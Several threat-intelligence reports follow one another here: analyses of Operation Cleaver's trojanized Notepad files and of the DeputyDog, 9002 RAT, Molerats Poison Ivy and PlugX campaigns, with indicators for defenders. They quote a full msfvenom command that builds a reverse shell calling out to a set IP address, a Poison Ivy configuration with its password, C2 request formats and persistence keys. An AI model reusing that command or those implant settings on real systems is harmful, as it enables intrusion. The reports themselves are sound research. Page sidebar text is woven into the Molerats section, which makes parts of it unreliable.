Abhedya is also visible in the PIEGAUZ.NET name server history : abedhya.net is currently a privacy protected domain , but it used to be registered by one Arun Bansal , CEO and founder of Mantra Ventures and the `` Ethical Hacking Institute '' hackingtruths.org .
Domain Name : ABHEDYA.NET Registrant : HackingTruths Arun Bansal ( arun @ hackingtruths.org ) * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * Delhi,110085 IN The domain appinonline.com is also hosted on the cloud service mantragrid.com , a Mantra Ventures company .
There is another interesting detail : We found a connection log on one of the open drop folders earlier mentioned .
This log folder was named `` test '' and data in it was uploaded from an IP belonging to the French provider OVH .
The log contained data from a lab test PC whose registered owner was `` innefu '' .
There is indeed an Indian information security consulting group named Innefu .
The domain innefu.com was registered by the same Arun Bansal .
Innefu also hires `` ethical hackers '' : It is possible that Mantra Tech Ventures hosted the malicious sites by coincidence , and it is possible that INNEFU ( if indeed the mentioned log came from them ) just happened to run the malware in an automatic test system like many other security vendors do as part of their malware analysis research .
When researching the attack against Telenor we were able to uncover that actors apparently operating from India have been conducting attacks against business , government and political organizations around the world for over three years .
There are also indicators of involvement by private sector companies or persons connected to these , though these data are circumstantial and may be attempts to implicate said companies .
We have no visibility into whether the attacks were done on behalf of others , and if so who commissioned them or whether all attacks were commissioned by one entity or by several .
The methods used were primarily based on different social engineering tactics rather than exploits , but history has shown that social engineering based attacks can be very successful , confirmed once again by looking at the data we have been able to uncover .
Organizations today need to realize that it 's not a matter of whether they will be compromised but a question of when and have a plan in place for how to deal with those compromises .
Bibliography Passive DNS data provided by ISC Security ( https : //security.isc.org/ ) Appendixes ( available in a separate document ) A .
Samples extracted from Telenor intrusion B .
Some related cases based on behaviour and malware similarity parameters .
You see some strange stuff out there on the networks where attackers are active .
Certainly the stash of files unearthed during the Operation Cleaver investigation included much of the bizarre and something of the terrible .
Brian Wallace , who led the investigation , shared a mysterious set of samples with me awhile back , and now that Operation Cleaver is public , I 'll relate the lurid technical details .
The files in question were found in a dim and dusty directory on a forlorn FTP server in the US , commingled with the detritus of past attack campaigns and successful compromises .
They were at once familiar and strange , and they were made still stranger and more perplexing by their location and the circumstances of their discovery .
All around them was a clutter of credential dumps , hacking utilities , RATs , and even legitimate software installers , but the files in question were none of these .
They were Notepad .
Of course , a purloined Notepad icon in malware is nothing new , but something different was going on here .
Within each of the two families , all of the samples had the same main icon , file size , and version information , yet each one had a distinct hash .
At the time , only one of those five hashes existed on the internet : the official 32-bit Simplified Chinese Notepad from Windows XP x64 / Windows Server 2003 .
Suspecting that the remaining Notepads were derivatives of official Windows files , we associated the other member of the first family with the confirmed legitimate Notepad , and we matched the second family with the 32-bit US English Notepad from Windows 7 ( not present in the original set ) .
Things got interesting when we started comparing the Notepads at the byte level .
The image below depicts some byte differences between the original Windows 7 Notepad and samples NOTEPAD2.EXE and Notepad3.exe : At the Portable Executable ( PE ) level , these differences translate to changes in the files ' timestamps ( IMAGE_NT_HEADERS.FileHeader . TimeDateStamp , offset 0xE8 in the figure above ) , the relative virtual addresses ( RVAs ) of their entry points ( IMAGE_NT_HEADERS.OptionalHeader . AddressOfEntryPoint , offset 0x108 ) , and their checksums ( IMAGE_NT_HEADERS.OptionalHeader . CheckSum , offset 0x138 ) .
The timestamps were rolled back by weeks to months relative to the legitimate progenitors ' timestamps ; we do n't know why .
The entry points retreated or advanced by hundreds of bytes to dozens of kilobytes , for reasons we 'll explore shortly .
And the checksums were all zeroed out , presumably because the file modifications invalidate them , invalid non - zero checksums are a tip - off , and zeroing is easier than recomputing .
So what 's the story with all those other modifications ? In all cases they seem to be confined to the `` .text
'' section , centrally located to avoid the import directory , debug directory , load configuration directory , and import address table .
This makes sense as a general precaution , considering that corrupting the import directory would unhelpfully crash the Windows loader during process initialization .
The following image illustrates the distribution of modifications relative to these structures .
While the arrangement of the structures varies among families , it 's clear from the figure above that the region between structures containing the original entry point has in each case been filled with modifications .
Notably , each sample has a short run of consecutive modifications immediately following the new entry point , and then a longer run elsewhere in the region .
Presumably , both runs are injected malicious code , and the other modifications may well be random noise intended as a distraction .
Since there are no other changes and no appended data , it 's reasonable to assume that the code that makes a Notepad act like Notepad is simply gone , and that the samples will behave only maliciously .
If true , then these modifications would represent a backdooring or `` Trojanization '' rather than a parasitic infection , and this distinction implies certain things about how the Notepads were made and how they might be used .
Let 's take a look at the entry point code of the malicious Notepads and see if it aligns with our observations .
The short answer is , it looks like nonsense .
Here 's a snippet from Notepad4.exe : At this point the code becomes difficult to list due to instruction scission , or branching into the middle of an instruction ( analogous to a frameshift error in DNA translation , if that helps ) .
For instance , the JNP instruction at 010067FF is a two - byte instruction , and the JNZ branch at 010067F9 , if satisfied , jumps to the JNP instruction 's second byte at 01006800 .
That byte begins a different two - byte instruction , which incorporates what would have otherwise been the first byte of the instruction after the JNP , meaning its successor will start in the middle of JNP 's successor , and so on .
The two execution paths usually ( but do n't necessarily ) converge after a few instructions .
The outcome of these instructions depends on the initial state of the registers , which is technically undefined .
Seeing code operate on undefined values typically suggests that the bytes are n't code after all and so should n't have been disassembled .
But keep looking .
Notice that there are no memory accesses ( which could raise an access violation ) , no stack pointer manipulation ( which could cause a stack overflow or underflow ) , no division instructions ( which could raise a divide exception ) , no invalid or privileged instructions , no interrupts or indirect branches -- really , no uncontrolled execution transfers of any kind .
Even more tellingly , all the possible execution paths seem to eventually flow to this code : Here the gaps in the listing indicate when the disassembly follows an unconditional branch .
The code seems to abruptly change character after the jump at 01006891 , transitioning from gibberish to a string of short sequences connected by unconditional branches .
This transition corresponds to a jump from the end of the short run of modifications ( 01006896 ) after the malware entry point to the beginning of the longer run of modifications ( 01005747 ) a few kilobytes before it .
( See the third column in Figure 3 .
) In the disassembly above , the first sequence of green lines is a clear CALL - POP pair intended to obtain a code address in a position - independent way .
( An immediate address value marked with a relocation would be the orthodox way to obtain a code pointer , but preparing that would have involved modifying the '' .reloc
'' section .
) No way is this construct a coincidence .
Furthermore , the blue lines strongly resemble the setup for a VirtualAlloc call ( VirtualAlloc ( NULL , 0x1A9 , MEM_COMMIT , PAGE_EXECUTE_READWRITE ) ) typical of a deobfuscation stub , and the second set of green lines invoke the CALL - POPped function pointer with what one might readily assume is a hash of the string '' VirtualAlloc '' .
( It is .
) There 's plenty more to observe in the disassembly , but , let 's fast - forward past it .
And now we can dump the extracted code from memory .
It is n't immediately gratifying : The byte 0xD6 at address 00100019 does n't disassemble , and there are n't any branches skipping over it .
But check out the instructions just above it referencing `` [ eax+19 ] '' .
The code is in a sense self - modifying , flowing right into a portion of itself that it XOR decodes .
The first decoded instruction is `` LOOP 00100010 '' ( 0xD6 ^ 0x34 = 0xE2 , the opcode for LOOP ) , which will execute the XOR loop body 99 more times ( CL - 1 = 0x63 = 99 ) and then fall through to the newly - decoded code .
When we run this decoding stub ( which , come to find out , is Metasploit 's `` shikata ga nai '' decoder stub ) to completion , we 're rewarded with ...
another decoding stub : Here , the first byte to be XORed is the second byte of the LOOP instruction , hence the nonsensical destination apparent in the pre - decoding disassembly above .
( For brevity , we cut each listing at the first sign of encoding .
) Run that to completion , and then ...
It looks like a call over a typical module or export lookup function .
In fact , it is , and as the ROR - ADD pair suggests , it implements module name and export name hashing , the algorithms of which can be expressed as follows : Still , this is all just preamble .
What is the point that it eventually gets to ? You 'd be forgiven for assuming that the tremendous amount of effort poured into obfuscation means there 's some treasure beyond all fables at the bottom of this erstwhile Notepad .
Sorry .
It just downloads and executes a block of raw code .
( Spoiler : it 's actually a Metasploit reverse connect stager .
) Here is its behavior summarized as function calls : The above is known to be true for Notepad3.exe , Notepad4.exe , and notepad10.exe .
NOTEPAD2.EXE does n't seem to want to run , for reasons we did n't bother to troubleshoot for the bad guys .
Unfortunately , we never did obtain a sample of the code that might have been downloaded .
The key to that enigma - embedded , mystery - wrapped riddle is forever lost to us .
The best we can do is read what 's written in the Notepads and speculate as to why they exist at all .
Clearly whatever generator created these Notepads is far , far beyond the technical understanding of the Cleaver team .
It stands to reason that there is a generator -- no chance these were crafted by hand -- and that its sophistication is even greater than that of its output .
Something like that would n't be used only once .
Something like that , if this team was able to get ahold of it , must be out there .
Turn the right corner of the internet , and you can find anything ...
Well it so happens that we did eventually find it .
Some of you have no doubt suspected it all along , and now I 'll humbly confirm it for you : the Notepads were , in their entirety , generated by Metasploit .
Something along the lines of `` msfvenom -x notepad.exe -p windows / shell / reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=108.175.152.230 LPORT=12345 > Notepad4.exe '' .
The `` msfvenom '' tool transmogrifies a Metasploit payload into a standalone EXE , and with the `` -x '' switch , it 'll fuse the payload- -encoded as desired -- into a copy of an existing executable , exhibiting exactly the behavior we just described .
Omne ignotum pro magnifico .
Perhaps the more bizarre a thing is , the less mysterious it proves to be .
However , we 're still left to wonder what Cleaver was up to when they generated all those Notepads .
One conclusion Brian proposed is that they 're intended as backdoors -- replacements for the legitimate Notepad on a compromised system -- which would enable Cleaver to regain access to a system at some indeterminate time in the future , the next time a user runs Notepad .
The team demonstrated a similarly intentioned tactic with a connect - back shell scheduled to run in a six - minute window each night ; the Notepad replacement , while more intrusive , could be another example of this contingency planning tendency .
Or maybe the Notepads were only an aborted experiment , attempted and shelved , forgotten in a flurry of compromises and criminal activity .
If nothing else , they made for an unexpected bit of mystery .
FireEye has discovered a campaign leveraging the recently announced zero - day CVE-2013 - 3893 .
This campaign , which we have labeled ' Operation DeputyDog ' , began as early as August 19 , 2013 and appears to have targeted organizations in Japan .
FireEye Labs has been continuously monitoring the activities of the threat actor responsible for this campaign .
Analysis based on our Dynamic Threat Intelligence cluster shows that this current campaign leveraged command and control infrastructure that is related to the infrastructure used in the attack on Bit9 .
Campaign Details On September 17 , 2013 Microsoft published details regarding a new zero - day exploit in Internet Explorer that was being used in targeted attacks .
FireEye can confirm reports that these attacks were directed against entities in Japan .
Furthermore , FireEye has discovered that the group responsible for this new operation is the same threat actor that compromised Bit9 in February 2013 .
FireEye detected the payload used in these attacks on August 23 , 2013 in Japan .
The payload was hosted on a server in Hong Kong ( 210.176.3.130 ) and was named `` img20130823.jpg '' .
Although it had a .jpg
file extension , it was not an image file .
The file , when XORed with 0×95 , was an executable ( MD5 : 8aba4b5184072f2a50cbc5ecfe326701 ) .
Upon execution , 8aba4b5184072f2a50cbc5ecfe326701 writes `` 28542CC0.dll '' ( MD5 : 46fd936bada07819f61ec3790cb08e19 ) to this location : C : \Documents and Settings\All Users\Application Data\28542CC0.dll In order to maintain persistence , the original malware adds this registry key : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\28542CC0 The registry key has this value : rundll32.exe `` C : \Documents and Settings\All Users\Application Data\28542CC0.dll '' , Launch The malware ( 8aba4b5184072f2a50cbc5ecfe326701 ) then connects to a host in South Korea ( 180.150.228.102 ) .
This callback traffic is HTTP over port 443 ( which is typically used for HTTPS encrypted traffic ; however , the traffic is not HTTPS nor SSL encrypted ) .
Instead , this clear - text callback traffic resembles this pattern : POST /info.asp HTTP/1.1 Content - Type : application / x - www - form - urlencoded Agtid : [ 8 chars ] 08x User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Win32 ) Host : 180.150.228.102:443 Content - Length : 1045 Connection : Keep - Alive Cache - Control : no - cache [ 8 chars ] 08x & [ Base64 Content ] The unique HTTP header `` Agtid : '' contains 8 characters followed by `` 08x '' .
The same pattern can be seen in the POST content as well .
A second related sample was also delivered from 111.118.21.105/css/sun.css on September 5 , 2013 .
The sun.css file was a malicious executable with an MD5 of bd07926c72739bb7121cec8a2863ad87 and it communicated with the same communications protocol described above to the same command and control server at 180.150.228.102 .
We found that both droppers , bd07926c72739bb7121cec8a2863ad87 and 8aba4b5184072f2a50cbc5ecfe326701 , were compiled on 2013 - 08 - 19 at 13:21:59 UTC .
As we examined these files , we noticed a unique fingerprint .
These samples both had a string that may have been an artifact of the builder used to create the binaries .
This string was `` DGGYDSYRL '' , which we refer to as `` DeputyDog '' .
As such , we developed the following YARA signature , based on this unique attribute : We used this signature to identify 5 other potentially related samples : Note that all of the samples , except for e9c73997694a897d3c6aadb26ed34797 , were compiled on 2013- 08 - 19 , within 1 second of each other .
We pivoted off the command and control IP addresses used by these samples and found the following known malicious domains recently pointed to 180.150.228.102 .
Links to Previous Campaigns According to Bit9 , the attackers that penetrated their network dropped two variants of the HiKit rootkit .
One of these Hitkit samples connected to a command and control server at downloadmp3server [ .
] servemp3 [ .
] com that resolved to 66.153.86.14 .
This same IP address also hosted www [ .
] yahooeast [ .
] net , a known malicious domain , between March 6 , 2012 and April 22 , 2012 .
The domain yahooeast [ .
] net was registered to 654 @ 123.com .
This email address was also used to register blankchair [ .
] com – the domain that we see was pointed to the 180.150.228.102 IP , which is the callback associated with sample 58dc05118ef8b11dcb5f5c596ab772fd , and has been already correlated back to the attack leveraging the CVE-2013 - 3893 zero - day vulnerability .
Threat Actor Attribution Conclusion While these attackers have a demonstrated previously unknown zero - day exploits and a robust set of malware payloads , using the techniques described above , it is still possible for network defense professionals to develop a rich set of indicators that can be used to detect their attacks .
This is the first part of our analysis , we will provide more detailed analysis on the other components of this attack in subsequent blog post .
This entry was posted in Advanced Malware , Exploits , Targeted Attack , Threat Intelligence , Threat Research by Ned Moran and Nart Villeneuve .
Bookmark the permalink .
Recently , we discovered a new IE zero - day exploit in the wild , which has been used in a strategic Web compromise .
Specifically , the attackers inserted this zero - day exploit into a strategically important website , known to draw visitors that are likely interested in national and international security policy .
We have identified relationships between the infrastructure used in this attack and that used in Operation DeputyDog .
Furthermore , the attackers loaded the payload used in this attack directly into memory without first writing to disk – a technique not typically used by advanced persistent threat ( APT ) actors .
This technique will further complicate network defenders ' ability to triage compromised systems , using traditional forensics methods .
Enter Trojan . APT.9002 On November 8 , 2013 our colleagues Xiaobo Chen and Dan Caselden posted about a new Internet Explorer 0-day exploit seen in the wild .
This exploit was seen used in a strategic Web compromise .
The exploit chain was limited to one website .
There were no iframes or redirects to external sites to pull down the shellcode payload .
Through the FireEye Dynamic Threat Intelligence ( DTI ) cloud , we were able to retrieve the payload dropped in the attack .
This payload has been identified as a variant of Trojan . APT.9002 ( aka Hydraq / McRAT variant ) and runs in memory only .
It does not write itself to disk , leaving little to no artifacts that can be used to identify infected endpoints .
Specifically , the payload is shellcode , which is decoded and directly injected into memory after successful exploitation via a series of steps .
After an initial XOR decoding of the payload with the key '' 0x9F '' , an instance of rundll32.exe is launched and injected with the payload using CreateProcessA , OpenProcess , VirtualAlloc , WriteProcessMemory , and CreateRemoteThread .
Figure 1 – Initial XOR decoding of shellcode , with key ' 0x9F ' Figure 2 – Shellcode launches rundll32.exe and injects payload After transfer of control to the injected payload in rundll32.exe , the shellcode is then subjected to two more levels of XOR decoding with the keys ' 0×01′ , followed by ' 0x6A ' .
Figure 3- Decoding shellcode with XOR key ' 0×01′ Figure 4 – Decoding shellcode with XOR key ' 0x6A ' Process execution is then transferred to the final decoded payload , which is a variant of the 9002 RAT .
Figure 5 – Transfer of process execution to final decoded payload The fact that the attackers used a non - persistent first stage payload suggests that they are confident in both their resources and skills .
As the payload was not persistent , the attackers had to work quickly , in order to gain control of victims and move laterally within affected organizations .
If the attacker did not immediately seize control of infected endpoints , they risked losing these compromised endpoints , as the endpoints could have been rebooted at any time – thus automatically wiping the in - memory Trojan . APT.9002 malware variant from the infected endpoint .
Alternatively , the use of this non - persistent first stage may suggest that the attackers were confident that their intended targets would simply revisit the compromised website and be re - infected .
This Trojan . APT.9002 variant connected to a command and control server at 111.68.9.93 over port 443 .
It uses a non - HTTP protocol as well as an HTTP POST for communicating with the remote server .
However , the callback beacons have changed in this version , in comparison to the older 9002 RATs .
The older traditional version of 9002 RAT had a static 4-byte identifier at offset 0 in the callback network traffic .
This identifier was typically the string `` 9002″ , but we have also seen variants , where this has been modified – such as the 9002 variant documented in the Sunshop campaign .
Figure 6 – Traditional 9002 RAT callback beacon In contrast , the beacon from the diskless 9002 payload used in the current IE 0-day attack is remarkably different and uses a dynamic 4-byte XOR key to encrypt the data .
This 4-byte key is present at offset 0 and changes with each subsequent beacon .
FireEye labs is aware that the 4- byte XOR version of 9002 has been in the wild for a while and is used by multiple APT actors , but this is the first time we ' ve seen it deployed in the diskless payload method .
Figure 7 – Sample callback beacons of the diskless 9002 RAT payload Figure 8 – XOR decrypted callback beacons of the diskless 9002 RAT payload The XOR decoded data always contains the static value `` \x09\x12\x11\x20″ at offset 16 .
This value is in fact hardcoded in packet data construction function prior to XOR encoding .
This value most likely is the date `` 2011 - 12 - 09″ but its significance is not known at this time .
Figure 9 – Packet data construction function showing hardcoded value The diskless 9002 RAT payload also makes a POST request , which has also changed from the traditional version .
It has Base64 stub data , instead of the static string `` AA '' .
The User - Agent string and URI pattern remain the same however .
It uses the static string `` lynx '' in the User - Agent string and the URI is incremental hexadecimal values .
The data in the POST stub is also encrypted with a 4-byte XOR key , and when decrypted , the data is similar to the data in the non - HTTP beacon and also has the static value `` \x09\x12\x11\x20″ .
We previously observed 104130d666ab3f640255140007f0b12d connecting to the same 111.68.9.93 IP address .
Analysis of MD5 104130d666ab3f640255140007f0b12d revealed that it shared unique identifying characteristics with 90a37e54c53ffb78969644b1a7038e8c , acbc249061a6a2fb09271a68d53567d9 , and 20854f54b0d03118681410245be39bd8 .
MD5 acbc249061a6a2fb09271a68d53567d9 and 90a37e54c53ffb78969644b1a7038e8c are both Trojan . APT.9002 variants and connect to a command and control server at 58.64.143.244 .
MD5 20854f54b0d03118681410245be39bd8 is another Trojan . APT.9002 variant .
This variant connected to a command and control server at ad04.bounceme.net .
Passive DNS analysis of this domain revealed that it resolved to 58.64.213.104 between 2011 - 09 - 23 and 2011 - 10 - 21 .
The following other domains have also been seen resolving to this same IP address : If the domain dll.freshdns.org rings a bell , it should .
While covering a different Internet Explorer Zero - day ( CVE-2013 - 3893 ) and the associated Operation DeputyDog campaign , we reported that the CnC infrastructure used in that campaign overlapped with this same domain : dll.freshdns.org .
Inside the in - memory version of the Trojan . APT.9002 payload used in this strategic Web compromise , we identified the following interesting string : `` rat_UnInstall '' .
Through DTI , we found this same string present in a number of different samples including the ones discussed above : 104130d666ab3f640255140007f0b12d 90a37e54c53ffb78969644b1a7038e8c acbc249061a6a2fb09271a68d53567d9 20854f54b0d03118681410245be39bd8 Based on this analysis , all of these samples , including the in - memory variant , can be detected with the following simple YARA signature : We also found the following strings of interest present in these above 9002 RAT samples ( excluding the in - memory variant ) : McpRoXy.exe SoundMax.dll These strings were all observed and highlighted by Bit9 here .
As Bit9 notes in their blog , Trojan . APT.9002 ( aka Hydraq / McRAT ) was also used in the original Operation Aurora campaign , and the `` rat_UnInstall '' string can be found in the original Aurora samples confirming the lineage .
By utilizing strategic Web compromises along with in - memory payload delivery tactics and multiple nested methods of obfuscation , this campaign has proven to be exceptionally accomplished and elusive .
APT actors are clearly learning and employing new tactics .
With uncanny timing and a penchant for consistently employing Zero - day exploits in targeted attacks , we expect APT threat actors to continue to evolve and launch new campaigns for the foreseeable future .
Not surprisingly , these old dogs continue to learn new tricks .
FireEye Labs would like to thank iSIGHT Partners for their assistance with this research .
This entry was posted in Exploits , Targeted Attack , Threat Intelligence , Threat Research , Vulnerabilities by Ned Moran , Sai Omkar Vashisht , Mike Scott and Thoufique Haq .
Bookmark the permalink .
Get a Demo Customer Support Contact Us ALL POSTS FIREEYE HOME Blog August 23 , 2013 | By Nart Villeneuve , Ned Moran and Thoufique Haq | Threat Intelligence , Threat Research Search Blog Do n't be too hasty to link every Poison Ivy-­based cyber attack to China .
The popular remote access tool ( RAT ) , which we recently detailed on this blog , is being used in a broad campaign of attacks launched from the Middle East , too .
Filter by Category First , some background : Select Category In October 2012 , malware attacks against Israeli government targets grabbed media attention as officials temporarily cut off Internet access for its entire police force and banned the use of USB memory sticks .
Security researchers Resources subsequently linked these attacks to a broader , yearlong campaign that targeted not just Israelis but Palestinians as Definitive Guide to well .
- and as discovered later , even the U.S. and UK governments .
Further research revealed a connection Next-­Generation Threat between these attacks and members of the so-­called '' Gaza Hackers Team .
'' We refer to this campaign as Protection '' Molerats .
'' Comprehensive guide on today 's new breed of cyber Threat actors in specific geographic regions may prefer one RAT to another , but many RATs are publicly available attacks and how next-­ and used by a variety of threat actors , including those involved in malware-­based espionage .
generation threat protection can fill the gaps in In 2012 , the Molerats attacks appeared to rely heavily on the XtremeRAT , a freely available tool that is popular with organizations ' network defenses attackers based in the Middle East .
But the group has also used Poison Ivy ( PIVY ) , a RAT more commonly associated with threat actors in China - so much so that PIVY has , inaccurately , become synonymous with all Download APT attacks linked to China .
Protecting Your Data , This blog post analyzes several recent Molerats attacks that deployed PIVY against targets in the Middle East and Intellectual Property , in the U.S. We also examine additional PIVY attacks that leverage Arabic-­language content related to the ongoing and Brand from Cyber crisis in Egypt and the wider Middle East to lure targets into opening malicious files .
Attacks Guide for CIOs , CFOs , and Enter Poison Ivy CISOs on why traditional security defenses are failing We observed several attacks in June and July 2013 against targets in the Middle East and the U.S. that dropped a and how losing the security PIVY payload that connected to command-­and-­control ( CnC ) infrastructure used by the Molerats attackers .
battle can hurt your business Download Subscribe to the Blog Your email : Enter email address ...
Subscribe YouTube View more videos » Facebook The malware sample we analyzed was unusual for two reasons : It referenced an article that was published last year The compile time for the dropped binary was also dated from last year , seemingly consistent with the referenced article .
But this malware was signed , and - in contrast to the compile time , which can be faked - the signing time on its certificate was much more recent : Monday , July 08 , 2013 1:45:10 A.M .
Here are the file details : Hamas shoot down Israeli F-16 fighter jet by modern weapon in Gaza sea.doc- – - – - – - – - – - -.scr MD5 : 7084f3a2d63a16a191b7fcb2b19f0e0d This malware was signed with a forged Microsoft certificate similar to previous XtremeRat samples .
But the serial number ( which is often reused by attackers , enabling FireEye researchers to link individual attacks , including those by the Molerats ) is different this time .
The malware dropped an instance of PIVY with the following configuration : ID : F16 08 - 07 - 2013 Group : DNS / Port : Direct : toornt.servegame.com:443 , Proxy DNS / Port : Proxy Hijack : No ActiveX Startup Key : HKLM Startup Entry : File Name : Install Path : C : \Documents and Settings\Admin\Local Settings\Temp\morse.exe Keylog Path : C : \Documents and Settings\Admin\Local Settings\Temp\morse Inject : No Process Mutex : gdfgdfgdg Key Logger Mutex : ActiveX Startup : No HKLM Startup : No Copy To : No Melt : No Persistence : No Keylogger : No Password : ! @ # GooD # @ ! We collected additional PIVY samples that had the same password or linked to CnC infrastructure at a common IP address ( or both ) .
We observed three PIVY passwords ( another potential identifier ) used in the attacks : '' ! @ # GooD # @ ! `` , '' ! @ # Goood # @ ! '' and '' admin100 '' .
Additional Samples with Middle Eastern Themes We also found a PIVY sample used by this group that leveraged what are known as key files instead of passwords .
The PIVY builder allows operators to load .pik
files containing a key to secure communications between the compromised computer and the attacker 's machine .
By default , PIVY secures these communications with the ascii text password of '' admin '' - when the same non-­default password appears in multiple attacks , researchers can conclude that the attacks are related .
The PIVY sample in question had an MD5 hash of 9dff139bbbe476770294fb86f4e156ac and communicated with a CnC server at toornt.servegame.com over port 443 .
The key file used to secure communications contained the following ascii string ' Password ( 256 bits ) : \x0d\x0aA9612889F6 ' ( where \x0d\x0a represents a line break ) .
The 9dff139bbbe476770294fb86f4e156ac sample dropped a decoy document in Arabic that included a transcript of an interview with Salam Fayyad , the former Prime Minister of the Palestinian National Authority .
The sample 16346b95e6deef9da7fe796c31b9dec4 was also seen communicating with toornt.servegame.com over port 443 .
This sample appears to have been delivered to its targets via a link to a RAR archive labeled Ramadan.rar ( fc554a0ad7cf9d4f47ec4f297dbde375 ) hosted at the Dropbox file-­sharing website .
The sample a8714aac274a18f1724d9702d40030bf dropped a decoy document in Arabic that contained a biography of General Adbel Fattah el-­Sisi – the Commander-­in-­Chief of the Egyptian Armed Forces .
A recent sample ( d9a7c4a100cfefef995785f707be895c ) used protests in Egypt to entice recipients to open a malicious file .
Another sample ( b0a9abc76a2b4335074a13939c59bfc9 ) contained a decoy with a grim picture of Fadel Al Radfani , who was the adviser to the defense minister of Yemen before he was assassinated .
Although we are seeing Egyptian-­ and Middle Eastern-­themed attacks using decoy content in Arabic , we can not determine the intended targets of all of these attacks .
Delivery Vector We believe that the Molerats attacker uses spear phishing to deliver weaponized RAR files containing their malicious payloads to their victims in at least two different ways .
The Molerats actor will in some cases attach the weaponized RAR file directly to their spear-­ phishing-­emails .
We also believe that this actor sends spear-­phishing emails that include links to RAR files hosted on third-­party platforms such as Dropbox .
In one such example we found the following link was used to host Ramadan.rar ( fc554a0ad7cf9d4f47ec4f297dbde375 ) : hxxps : //dl [ .
] dropboxusercontent [ .
] com / s / uiod7orcpykx2g8/Ramadan.rar ? token_hash = AAHAVuiXpTkOKwar9e0WH-­ EfrK7PEB9O7t7WC6Tgtn315w & dl=1 CnC Infrastructure We have found 15 PIVY samples that can be linked through common passwords , common CnC domain names , and common IP addresses to which the CnC domains resolve .
The CnC servers for this cluster of activity are : toornt.servegame.com updateo.servegame.com egypttv.sytes.net skype.servemp3.com natco2.no-­ip.net Two of the domain names ( natco2.no-­ip.net and skype.servemp3.com ) that were used as CnCs for PIVY were both documented as XtremeRat CnCs that were used in previous attacks .
We focused on these domains and their IP addresses - which they had in common with toornt.servegame.com .
In addition , we added the well-­known CnCs good.zapto.org and hint.zapto.org used in previously documented attacks .
By observing changes in DNS resolution that occurred within the same timeframe , we were able to ensure that the passive DNS data we collected was the same .
Interestingly , we also found that the domains often shifted to a new IP address over time .
One interesting discovery concerns a sample ( 5b740b4623b2d1049c0036a6aae684b0 ) that was first seen by VirusTotal on September 14 , 2012 .
This date is within the timeframe of the original XtremeRat attacks , but the payload in this case was PIVY .
This indicates that the attackers have been using PIVY in addition to XtremeRat for longer than we had originally believed .
Conclusion We do not know whether using PIVY is an attempt by those behind the Molerats campaign to frame China-­based threat actors for their attacks or simply evidence that they have added another effective , publicly-­available RAT to its arsenal .
But this development should raise a warning flag for anyone tempted to automatically attribute all PIVY attacks to threat actors based in China .
The ubiquity of off-­the-­shelf RATs makes determining those responsible an increasing challenge .
The ongoing attacks are also heavily leveraging content in Arabic that uses conflicts in Egypt and the wider Middle East to lure targets into opening malicious files .
But we have no further information about the exact targets of these Arabic lures .
As events on the ground in the Middle East - and in Egypt in particular - receive international attention , we expect the Molerat operators to continue leveraging these headlines to catalyze their operations .
Yara Signature This Yara signature can be used to locate signed samples that have the new certificate serial numbers used by Molerats .
Samples 9dff139bbbe476770294fb86f4e156ac 6350d1039742b87b7917a5e26de2c25c b0a9abc76a2b4335074a13939c59bfc9 5b740b4623b2d1049c0036a6aae684b0 9dff139bbbe476770294fb86f4e156ac cf31aea415e7013e85d1687a1c0f5daa 973b5f2a5608d243e7305ee4f9249302 e85fc76362c2e9dc7329fddda8acc89e b05603938a888018d4dcdc551c4be8ac 7084f3a2d63a16a191b7fcb2b19f0e0d 16346b95e6deef9da7fe796c31b9dec4 a8714aac274a18f1724d9702d40030bf d9a7c4a100cfefef995785f707be895c 9ef9a631160b96322010a5238defc673 a60873e364a01870b2010518d05a62df This entry was posted in Threat Intelligence , Threat Research by Nart Villeneuve , Ned Moran and Thoufique Haq .
Bookmark the permalink .
← Previous Next → OCULUS THREAT PREVENTION PLATFORMS INFO AND RESOURCES CONNECT Overview of Oculus NX Series Info Center Blog Today 's Advanced Cyber Threats EX Series Investor Relations Twitter Why Do n't Traditional Defenses Work ? FX Series Partners Facebook Why FireEye ? Mobile Security News and Events LinkedIn AX Series Support Solutions for Government About FireEye More Products and Solutions 877.FIREEYE ( 877.347.3393 ) REQUEST INFO Copyright © 2006-­2013 FireEye , Inc. All rights reserved .
Introduction Our worldwide sensor network provides researchers at FireEye Labs with unique opportunities to detect innovative tactics employed by malicious actors and protects our clients from these tactics .
We recently uncovered a coordinated campaign targeting Internet infrastructure providers , a media organization , a financial services company , and an Asian government organization .
The actor responsible for this campaign utilized legitimate digital certificates to sign their tools and employed innovative techniques to cloak their command and control traffic .
Hurricane Electric Redirection In March of 2014 , we detected Kaba ( aka PlugX or SOGU ) callback traffic to legitimate domains and IP addresses .
Our initial conclusion was that this traffic was the result of malicious actors ' sleeping ' their implants , by pointing their command and control domains at legitimate IP addresses .
As this is a popular technique , we did not think much of this traffic at the time .
Further analysis revealed that the HTTP headers of the traffic in question contained a Host : entry for legitimate domains .
As we have previously observed malware families that forge their HTTP headers to include legitimate domains in callback traffic , we concluded that the malware in this case was configured in the same way .
An example of the observed traffic is as follows : POST /C542BB084F927229348B2A34 HTTP/1.1 Accept : * / * CG100 : 0 CG103 : 0 CG107 : 61456 CG108 : 1 User - Agent : Mozilla/4.0 ( compatible ; MSIE 9.0 ; Windows NT 6.1 ; SLCC2 ; .NET
CLR 2.0.50727 ; .NET
CLR 3.5.30729 ; .NET
CLR 3.0.30729 ; Media Center PC 6.0 ; .NET4.0C
) Host : www.adobe.com Content - Length : 0 Cache - Control : no - cache As we continued to see this odd traffic throughout the summer we began a search for malware samples responsible for this behavior .
Via this research , we found a malware sample that we believe was responsible for at least some of the strange traffic that we had observed .
The identified sample had the following properties : MD5 : 52d2d1ab9b84303a585fb81e927b9e01 Size : 180296 Compile Time : 2013 - 10 - 15 05:17:37 Import Hash : b29eb78c7ec3f0e89bdd79e3f027c029 .rdata
: d7b6e412ba892e9751f845432625bbb0 .text
: ed0dd6825e3536d878f39009a7777edc .data
: 1bc25d2f0f3123bedea254ea7446dd50 .rsrc
: 91484aa628cc64dc8eba867a8493c859 .reloc
: f1df8fa77b5abb94563d5d97e5ccb8e2 RT_VERSION : 9dd9b7c184069135c23560f8fbaa829adc7af6d2047cf5742b5a1e7c5c923cb9 This sample was signed with a legitimate digital certificate from the ' Police Mutual Aid Association ' .
This certificate has a serial number of ' 06 55 69 a3 e2 61 40 91 28 a4 0a ff a9 0d 6d 10 ' .
